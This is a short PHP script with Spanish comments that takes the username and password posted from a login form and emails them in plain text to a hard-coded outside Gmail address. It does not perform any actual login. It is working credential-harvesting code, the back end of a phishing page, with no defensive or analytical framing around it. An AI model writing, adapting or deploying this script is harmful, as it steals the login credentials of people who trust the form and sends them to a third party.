<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST['usuario'];
    $contraseña = $_POST['contraseña'];

    // Configuración del correo electrónico
    $destinatario = 'wallaceytx@gmail.com';
    $asunto = 'Inicio de sesión';
    $mensaje = "Nombre de usuario: $usuario\nContraseña: $contraseña";

    // Envío del correo electrónico
    $resultado = mail($destinatario, $asunto, $mensaje);
}
?>
